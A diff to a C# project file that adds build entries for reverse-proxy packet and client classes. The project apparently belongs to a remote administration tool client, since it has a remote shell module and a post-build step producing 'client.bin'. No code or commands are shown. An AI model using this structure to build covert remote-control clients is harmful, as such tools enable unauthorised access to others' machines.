@@ -105,6 +105,12 @@
     <Compile Include="Core\ProtoBuf\ProtoConverterAttribute.cs" />
     <Compile Include="Core\ProtoBuf\Serializers\ImmutableCollectionDecorator.cs" />
     <Compile Include="Core\RemoteShell\Shell.cs" />
+    <Compile Include="Core\ReverseProxy\Packets\ReverseProxy_Connect.cs" />
+    <Compile Include="Core\ReverseProxy\Packets\ReverseProxy_ConnectResponse.cs" />
+    <Compile Include="Core\ReverseProxy\Packets\ReverseProxy_Data.cs" />
+    <Compile Include="Core\ReverseProxy\Packets\ReverseProxy_Disconnect.cs" />
+    <Compile Include="Core\ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Core\ReverseProxy\ReverseProxyCommandHandler.cs" />
     <Compile Include="Core\SystemCore.cs" />
     <Compile Include="Core\Packets\ClientPackets\Status.cs" />
     <Compile Include="Core\Packets\ClientPackets\Initialize.cs" />
@@ -221,6 +227,7 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
